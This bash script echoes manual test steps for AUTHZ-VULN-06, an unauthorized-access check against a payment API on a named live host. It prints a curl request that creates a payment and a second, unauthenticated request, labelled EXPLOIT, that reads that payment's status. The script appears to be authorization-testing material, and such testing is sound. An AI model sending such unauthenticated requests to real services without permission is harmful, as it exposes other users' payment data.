#!/bin/bash
# Manual test script for AUTHZ-VULN-06

echo "=================================================================================="
echo " AUTHZ-VULN-06: Unauthorized Payment Status Access Test"
echo "=================================================================================="
echo ""
echo "STEP 1: Create Payment"
echo "Run this command in your terminal:"
echo ""
echo 'curl -X POST https://solana-blik.vercel.app/api/payments/create \\'
echo '  -H "Content-Type: application/json" \\'
echo '  -d '"'"'{"amount": 5.0, "merchantWallet": "11111111111111111111111111111111"}'"'"
echo ""
echo "Copy the paymentId from the response."
echo ""
echo "STEP 2: Test Unauthorized Access (EXPLOIT)"
echo "Replace <PAYMENT_ID> with the actual payment ID:"
echo ""
echo 'curl -X GET https://solana-blik.vercel.app/api/payments/<PAYMENT_ID>/status'
echo ""
echo "If you get a 200 response with payment details, the vulnerability is CONFIRMED."
echo "If you get a 401/403 response, the endpoint is properly secured."
echo ""
